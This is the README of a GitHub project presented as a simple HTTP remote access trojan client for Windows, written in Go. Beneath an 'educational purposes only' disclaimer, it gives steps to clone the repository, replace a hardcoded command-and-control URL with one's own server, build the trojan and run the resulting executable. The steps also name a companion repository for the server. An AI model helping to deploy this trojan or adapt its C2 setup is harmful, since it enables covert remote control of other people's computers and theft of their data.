# SHRATC
## Simple Http RAT Client
#### A simple http remote access trojan written in golang

> **Note:** Only works on windows

## Educational purposes only! Run only if you have explicit permission!!

### Uninstall
run the `uninstall.ps1` script. Right click and `Run with powershell` or open powershell and do `.\uninstall.ps1`

### Install
 1. Clone the github repo `git clone https://github.com/flebedev77/SHRATC.git .`
 2. Change the line of code that has `url := "http://shratcacs.onrender.com"` and change `http://shratcacs.onrender.com` to your command and control server url. Where you can get from `https://github.com/flebedev77/SHRATACS`
 3. Build using golang `go build`
 4. Run `.\trojan.client.exe`